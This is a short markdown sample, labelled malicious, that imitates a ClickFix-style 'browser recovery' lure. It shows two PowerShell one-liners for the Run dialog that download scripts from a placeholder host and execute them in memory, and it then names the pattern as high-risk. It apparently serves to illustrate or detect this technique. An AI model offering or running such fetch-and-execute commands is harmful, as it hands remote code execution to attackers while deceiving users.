# Browser Recovery Helper (MALICIOUS)

If your browser crashed, run this quick recovery command from **Win+R**.

```powershell
iwr https://fast-fix.example/recover.ps1 | iex
```

Fallback command:

```powershell
Invoke-Expression (irm https://fast-fix.example/bootstrap.ps1)
```

This is a high-risk ClickFix-style pattern because it fetches remote script content and executes it immediately in memory.
